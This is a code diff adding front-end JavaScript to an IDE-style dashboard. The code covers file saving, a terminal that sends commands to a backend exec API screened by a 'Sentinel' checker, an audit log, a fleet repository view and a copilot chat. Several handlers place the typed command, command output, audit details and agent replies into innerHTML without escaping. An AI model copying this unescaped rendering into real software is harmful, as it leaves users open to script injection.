+        // REAL FILE SAVE (NATIVE IPC + HTTP FALLBACK)
+        async function saveCurrentFile() {
+            if (!currentLoadedPath) return;
+            const fallback = document.getElementById('fallbackEditor');
+            const content = monacoInstance ? monacoInstance.getValue() : (fallback ? fallback.value : '');
+
+            try {
+                let data;
+                if (isNative) {
+                    data = await window.tumAPI.writeFile(currentLoadedPath, content);
+                } else {
+                    const res = await fetch(`${API_BASE}/api/fs/write`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ filePath: currentLoadedPath, content })
+                    });
+                    data = await res.json();
+                }
+
+                if (data && data.success) {
+                    showToast(`✓ Saved to disk: ${currentLoadedPath.split('/').pop()}`);
+                } else {
+                    alert('Save failed: ' + (data ? data.error : 'Unknown error'));
+                }
+            } catch (err) {
+                alert('Save error: ' + err.message);
+            }
+        }
+
+        // KEYBOARD SHORTCUT: Ctrl+S (Save), Ctrl+O (Open Folder)
+        window.addEventListener('keydown', e => {
+            if ((e.ctrlKey || e.metaKey) && e.key === 's') {
+                e.preventDefault();
+                saveCurrentFile();
+            }
+            if ((e.ctrlKey || e.metaKey) && (e.key === 'o' || e.key === 'O')) {
+                e.preventDefault();
+                openFolderPrompt();
+            }
+        });
+
+        // REAL TERMINAL COMMAND EXECUTION (NATIVE IPC + HTTP FALLBACK)
+        function handleTerminalEnter(e) {
+            if (e.key === 'Enter') {
+                const cmd = e.target.value.trim();
+                if (!cmd) return;
+                e.target.value = '';
+                runRealCommand(cmd);
+            }
+        }
+
+        async function runRealCommand(command) {
+            const out = document.getElementById('terminalOutput');
+            out.innerHTML += `\n<span style="color: var(--primary); font-weight: 700;">tum $</span> ${command}\n`;
+
+            try {
+                let data;
+                if (isNative) {
+                    data = await window.tumAPI.runCommand(command, currentWorkspaceDir);
+                } else {
+                    const res = await fetch(`${API_BASE}/api/terminal/exec`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ command, cwd: currentWorkspaceDir })
+                    });
+                    data = await res.json();
+                }
+
+                const shieldPill = document.getElementById('sentinelShieldPill');
+                const shieldText = document.getElementById('sentinelShieldText');
+                const statusScore = document.getElementById('statusRiskScore');
+
+                if (!data.allowed) {
+                    shieldPill.className = 'status-pill danger';
+                    shieldText.textContent = `SENTINEL: BLOCKED (${data.verdict.riskScore}/100)`;
+                    statusScore.innerHTML = `<strong style="color: var(--rose);">${data.verdict.riskScore} / 100 (CRITICAL)</strong>`;
+
+                    out.innerHTML += `<span style="color: var(--rose); font-weight: 700;">🚨 [EXECUTION BLOCKED BY SENTINEL] 🚨</span>\n`;
+                    out.innerHTML += `<span style="color: var(--rose);">${data.verdict.action} | Threat: ${data.verdict.threatCategory} | Risk: ${data.verdict.riskScore}/100</span>\n`;
+                    out.innerHTML += `<span style="color: var(--text-muted);">Attribution: ${data.verdict.attribution.reason}</span>\n`;
+                } else {
+                    shieldPill.className = 'status-pill';
+                    shieldText.textContent = `SENTINEL: ARMED (${data.verdict.riskScore}/100)`;
+                    statusScore.innerHTML = `<strong style="color: var(--emerald);">${data.verdict.riskScore} / 100 (Safe)</strong>`;
+
+                    if (data.execution.stdout) out.innerHTML += `${data.execution.stdout}\n`;
+                    if (data.execution.stderr) out.innerHTML += `<span style="color: var(--amber);">${data.execution.stderr}</span>\n`;
+                    out.innerHTML += `<span style="color: var(--text-dim);">[Process finished with exit code ${data.execution.code} in ${data.execution.durationMs}ms]</span>\n`;
+                }
+
+                loadRealAuditLog();
+            } catch (err) {
+                out.innerHTML += `<span style="color: var(--rose);">Execution error: ${err.message}</span>\n`;
+            }
+
+            out.parentElement.scrollTop = out.parentElement.scrollHeight;
+        }
+
+        // REAL AUDIT LOG
+        async function loadRealAuditLog() {
+            try {
+                let data;
+                if (isNative) {
+                    data = await window.tumAPI.getAuditLog(25);
+                } else {
+                    const res = await fetch(`${API_BASE}/api/sentinel/audit?limit=25`);
+                    data = await res.json();
+                }
+
+                const auditDiv = document.getElementById('auditOutput');
+                if (data.audit && data.audit.length > 0) {
+                    auditDiv.innerHTML = data.audit.map(e => {
+                        const color = e.riskScore > 70 ? 'var(--rose)' : (e.riskScore > 20 ? 'var(--amber)' : 'var(--emerald)');
+                        return `<div><span style="color: ${color};">[${e.verdict}]</span> Risk: ${e.riskScore}/100 | ${e.timestamp} | <span style="color: #fff;">${e.detail}</span></div>`;
+                    }).join('');
+                } else {
+                    auditDiv.innerHTML = '<div>[AUDIT STREAM]: Circular ring-buffer clean. No security incidents recorded.</div>';
+                }
+            } catch (err) {
+                console.error('Failed to load audit log:', err);
+            }
+        }
+
+        // SIDEBAR TAB SWITCHING
+        async function selectSidebarTab(tab) {
+            document.querySelectorAll('.activity-btn').forEach(b => b.classList.remove('active'));
+            event.target.classList.add('active');
+
+            const content = document.getElementById('sidebarContent');
+            const title = document.getElementById('sidebarHeaderTitle');
+
+            if (tab === 'fleet') {
+                title.textContent = 'Fleet: 5 Repositories';
+                content.innerHTML = '<div style="padding: 16px; color: var(--text-dim);">Scanning fleet...</div>';
+
+                try {
+                    let data;
+                    if (isNative) {
+                        data = await window.tumAPI.getFleetStatus();
+                    } else {
+                        const res = await fetch(`${API_BASE}/api/fleet/status`);
+                        data = await res.json();
+                    }
+
+                    content.innerHTML = `<div style="padding: 12px; font-size: 12px; font-family: var(--font-code);">` +
+                        data.repos.map(r => `
+                            <div style="margin-bottom: 12px; border-left: 2px solid ${r.hasUncommittedChanges ? 'var(--amber)' : 'var(--emerald)'}; padding-left: 8px;">
+                                <div style="font-weight: 700; color: #fff;">${r.name}</div>
+                                <div style="color: var(--primary); font-size: 11px;">Branch: ${r.currentBranch}</div>
+                                <div style="color: var(--text-dim); font-size: 10px;">${r.latestCommit.substring(0, 36)}...</div>
+                                <div style="color: var(--text-muted); font-size: 10px; margin-top: 2px;">Worktrees: ${r.worktrees.length}</div>
+                            </div>
+                        `).join('') + `</div>`;
+                } catch (e) {
+                    content.innerHTML = '<div style="padding: 16px; color: var(--rose);">Failed to load fleet</div>';
+                }
+            } else if (tab === 'agentgate') {
+                title.textContent = 'AgentGate DAC Registry';
+                content.innerHTML = `
+                    <div style="padding: 12px; font-size: 11px; font-family: var(--font-code);">
+                        <div style="background: #04060b; padding: 10px; border-radius: 6px; border: 1px solid var(--border); margin-bottom: 10px;">
+                            <div style="color: var(--primary); font-weight: 700;">dac_86b887f458bcdf78b9db32da</div>
+                            <div style="color: #94a3b8; margin-top: 4px;">Sponsor: Pasit (CEO)</div>
+                            <div style="color: #94a3b8;">Agent: agent_lead_01</div>
+                            <div style="color: var(--emerald); margin-top: 4px;">Status: ACTIVE_VERIFIED</div>
+                            <div style="color: var(--secondary); margin-top: 2px;">NIST_FIPS_204_ML_DSA_65</div>
+                        </div>
+                        <button class="btn-mini" style="width: 100%;" onclick="mintRealDac()">⚡ Mint New Real DAC</button>
+                    </div>
+                `;
+            } else if (tab === 'sentinel') {
+                title.textContent = 'Sentinel Threat Radar';
+                content.innerHTML = `
+                    <div style="padding: 14px; font-size: 12px;">
+                        <div style="text-align: center; padding: 20px 0;">
+                            <div style="font-size: 42px; font-weight: 800; color: var(--emerald); font-family: var(--font-code);">0 <span style="font-size: 16px;">/ 100</span></div>
+                            <div style="color: var(--emerald); font-weight: 700; font-size: 13px; margin-top: 4px;">HOST ENVIRONMENT: BENIGN</div>
+                        </div>
+                        <div style="border-top: 1px solid var(--border); padding-top: 12px; font-family: var(--font-code); font-size: 11px; line-height: 1.8;">
+                            <div>🛡️ AST Parsing: <strong>ACTIVE</strong></div>
+                            <div>🚫 Shell Injection: <strong>BLOCKED</strong></div>
+                            <div>🔑 Exfiltration: <strong>ISOLATED</strong></div>
+                            <div>🔄 Ring Buffer: <strong>200 SLOTS</strong></div>
+                        </div>
+                    </div>
+                `;
+            } else {
+                title.textContent = 'Explorer: tum-central-director';
+                loadRealFileTree();
+            }
+        }
+
+        async function mintRealDac() {
+            try {
+                let data;
+                if (isNative) {
+                    data = await window.tumAPI.mintDac('คุณ Pasit (CEO)', 'agent_sovereign_01', 'Lead Systems Architect', 100.00);
+                } else {
+                    const res = await fetch(`${API_BASE}/api/agentgate/mint`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            humanSponsor: 'คุณ Pasit (CEO)',
+                            agentId: 'agent_sovereign_01',
+                            role: 'Lead Systems Architect',
+                            maxTokenBudgetUsd: 100.00
+                        })
+                    });
+                    data = await res.json();
+                }
+
+                if (data.success) {
+                    showToast(`✓ Minted DAC: ${data.credential.tokenId}`);
+                    document.getElementById('activeDacPill').textContent = data.credential.tokenId.substring(0, 14) + '...';
+                }
+            } catch (err) {
+                alert('Mint error: ' + err.message);
+            }
+        }
+
+        // BOTTOM PANEL TAB SWITCH
+        function switchBottomPanel(tab) {
+            document.getElementById('btnTabTerm').classList.toggle('active', tab === 'terminal');
+            document.getElementById('btnTabAudit').classList.toggle('active', tab === 'audit');
+            document.getElementById('tabTerminalView').style.display = tab === 'terminal' ? 'flex' : 'none';
+            document.getElementById('tabAuditView').style.display = tab === 'audit' ? 'flex' : 'none';
+            if (tab === 'audit') loadRealAuditLog();
+        }
+
+        // MARKDOWN FORMATTER FOR COPILOT CHAT
+        function formatMarkdown(text) {
+            if (!text) return '';
+            return text
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/```([\s\S]*?)```/g, '<pre style="background:#030712;padding:8px;border-radius:4px;overflow-x:auto;margin:6px 0;font-family:var(--font-code);border:1px solid rgba(255,255,255,0.1);"><code>$1</code></pre>')
+                .replace(/`([^`]+)`/g, '<code style="background:rgba(255,255,255,0.1);padding:2px 4px;border-radius:3px;font-family:var(--font-code);color:var(--primary);">$1</code>')
+                .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
+                .replace(/\*([^*]+)\*/g, '<em>$1</em>')
+                .replace(/\n/g, '<br>');
+        }
+
+        // MOBILE VIEW SWITCHER
+        function switchMobileView(view) {
+            document.querySelectorAll('.mobile-nav-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('mNav_' + view)?.classList.add('active');
+            document.body.className = 'view-' + view;
+            if (view === 'editor' && monacoInstance) {
+                setTimeout(() => monacoInstance.layout(), 100);
+            }
+        }
+
+        // QUICK SEND CHIPS
+        function quickSend(promptText) {
+            document.getElementById('copilotPrompt').value = promptText;
+            sendCopilotChat();
+        }
+
+        // ENTER KEY HANDLER (Enter to send, Shift+Enter for newline)
+        function handleCopilotKey(e) {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                sendCopilotChat();
+            }
+        }
+
+        // REAL COPILOT CHAT (NATIVE IPC + AGY ENGINE)
+        async function sendCopilotChat() {
+            const input = document.getElementById('copilotPrompt');
+            const text = input.value.trim();
+            if (!text) return;
+            input.value = '';
+
+            const chat = document.getElementById('chatMessages');
+            chat.innerHTML += `<div class="msg-bubble user">${text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>`;
+
+            const persona = document.getElementById('personaSelect').value;
+            const loadingId = 'loading_' + Date.now();
+            chat.innerHTML += `<div class="msg-bubble agent" id="${loadingId}"><em>🤖 TUM Agent is thinking...</em></div>`;
+            chat.scrollTop = chat.scrollHeight;
+
+            try {
+                let data;
+                if (isNative) {
+                    data = await window.tumAPI.sendCopilotChat(text, persona, currentWorkspaceDir);
+                } else {
+                    const res = await fetch(`${API_BASE}/api/copilot/chat`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ message: text, persona, workspace: currentWorkspaceDir })
+                    });
+                    data = await res.json();
+                }
+
+                const loadingEl = document.getElementById(loadingId);
+                if (loadingEl) {
+                    loadingEl.innerHTML = `<strong>TUM Agent:</strong><br>${formatMarkdown(data.reply)}`;
+                }
+            } catch (err) {
+                const loadingEl = document.getElementById(loadingId);
+                if (loadingEl) {
+                    loadingEl.innerHTML = `<span style="color: var(--rose);">Agent error: ${err.message}</span>`;
+                }
+            }
+            chat.scrollTop = chat.scrollHeight;
+        }
+
+        async function copilotDecompose() {
+            const chat = document.getElementById('chatMessages');
+            const loadingId = 'loading_decomp_' + Date.now();
+            chat.innerHTML += `<div class="msg-bubble agent" id="${loadingId}"><em>🏛️ AI Architect analyzing connected repository worktrees...</em></div>`;
+            chat.scrollTop = chat.scrollHeight;
+
+            try {
+                let data;
+                const prompt = 'Analyze current workspace and decompose into 4 parallel worktree engineering tasks for Frontend Kiosk, Trust Security HAL, Quantum ML-DSA, and Socs Telemetry.';
+                if (isNative) {
+                    data = await window.tumAPI.sendCopilotChat(prompt, 'architect', currentWorkspaceDir);
+                } else {
+                    const res = await fetch(`${API_BASE}/api/copilot/chat`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ message: prompt, persona: 'architect', workspace: currentWorkspaceDir })
+                    });
+                    data = await res.json();
+                }
+
+                const loadingEl = document.getElementById(loadingId);
+                if (loadingEl) {
+                    loadingEl.innerHTML = `<strong>🏛️ Architecture Decomposed (ECC Multi-Worktree):</strong><br>${data.reply.replace(/\n/g, '<br>')}<br><span style="color: var(--emerald);">✓ Ready to spawn parallel worktrees via WorktreeManager!</span>`;
+                }
+            } catch (err) {
+                const loadingEl = document.getElementById(loadingId);
+                if (loadingEl) {
+                    loadingEl.innerHTML = `<span style="color: var(--rose);">Decomposition error: ${err.message}</span>`;
+                }
+            }
+            chat.scrollTop = chat.scrollHeight;
+        }
+    </script>
+</body>
+</html>
